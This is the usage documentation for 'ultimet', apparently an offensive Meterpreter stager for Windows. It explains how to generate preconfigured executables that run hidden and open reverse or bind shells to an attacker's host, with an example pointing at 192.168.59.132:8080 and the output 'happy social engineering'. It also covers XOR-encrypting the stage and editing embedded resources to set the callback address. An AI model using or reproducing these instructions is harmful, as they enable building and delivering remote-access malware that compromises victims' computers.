- ultimet.exe --help
- if you want the exe without the stage "smaller file, more noisy and no metsvc", run `ultimet.exe --remove-stage` and you'll get a new file "ultimet_no_stage.exe".
- now you can create msfpayload-like exe:


Example:
c:\>ultimet.exe -t reverse_http -h 192.168.59.132 -p 8080 --msfpayload

[*] Success! REVERSE_HTTP-192.168.59.132-8080.exe created, happy social engineering...

==============
- this will create a new exe "reverse_http-192.168.59.132-8080.exe" that when executed, will run hidden, and requires no command line options.

- You can remove the options and revert a pre-configured exe to a regular ultimet using the option `--reset`

Example:
c:\>reverse_http-192.168.59.132-8080.exe --reset

Usage:
utlimet.exe -h <LHOST> -p <LPORT> -t <TRANSPORT> [-f FILENAME] [--msfpayload]
                                                 [--remove-stage] [--reset]

Connection settings:
        -h      LHOST   IP or a hostname.
        -p      LPORT   Port number."
        -t      TRANSPORT "reverse_tcp", "reverse_metsvc", "reverse_http",
                          "reverse_https","bind_tcp" or "bind_metsvc"

HTTP(S) Specific settings `optional`:
        -ua     U_AGENT User-Agent, enclose in `""` if contains spaces.
        -et     SECONDS Session expiration timeout in seconds.
        -ct     SECONDS Communication expiration timeout in seconds.

MSFPAYLOAD-like functionality:
        --msfpayload    When this is specified along with the connection
                        parameters, new exe will be created with the following
                        naming convention:TRANSPORT-LHOST-LPORT.exe,
                        this newly created exe will execute silently according
                        to the predefined settings.
                         ... it's gonna be just like the exe files you get out
                         of msfpayload ... on steroids :)
        --reset         A new exe will be created `ultimet_reset.exe` with
                        pre-defined settings cleared `undo -> --msfpayload`.

Stage options:
        -f      FILE    Forces loading the stage from a file.
                        Note: The file can be a regular metsrv.dll,
                        or an encrypted one using the ultimet_xor.exe utility.
        --remove-stage  Creates a new exe `ultimet_no_stage.exe` with stage
                        resource removed, it will resut in smaller file, but
                        metsvc family of payloads won't be available.
                        To re-attach the resource ... use a resource editor.

General notes:
 - If you find the console window disappears immediatly when you run ultimet,
   this means it found valid connection settings built-in, to get rid of this
   behaviour, `ultimet.exe --reset` will create a pristine `ultimet_reset.exe`.
 - The exe file created with `--msfpayload` option is a fully functional
   ultimet.exe, it will run hidden and doesn't require connection parameters
   to be specified since they're preconfigured, to reset that exe to its norm,
   just specify `--reset` and a fresh exe will be created with default settings
 - If you're on a shell [not a console], you have to start the program using:
   "start /b ultimet.exe ..." or you'll lose your shell.
 - For the reverse_metsvc & bind_metsvc options, stage has to be available
   upfront, either through the bundled resource or loaded usng the "-f" option
 - The most reliable handler for reverse_metsvc is:
   "windows/metsvc_reverse_tcp" ... using reverse_metsvc to connect to a
   "reverse_tcp" *might* work, but not always, so, use reverse_metsvc with
   windows/metsvc_reverse_tcp ... same applies to bind_metsv.

Advanced notes:
 - ultimet utilizes resources to include the stage, and to store connection
   settings internally.
 - The stage `metsvc.dll` is stored in a resource `BINARY` and ID `101`,
   stage can be the plain metsvc.dll file or encrypted using ultimet_xor.exe
   utility.
 - Options are stored in a resource `BINARY` and ID `103` using the following
   convention: `|UM|TRANSPORT|LHOST|LPORT|` <- leave "|UM|" as it is since
   it's used inernally, and change connection settings as you like.
 - You can use your favourite resource editor to create/edit those resources as
   you please.
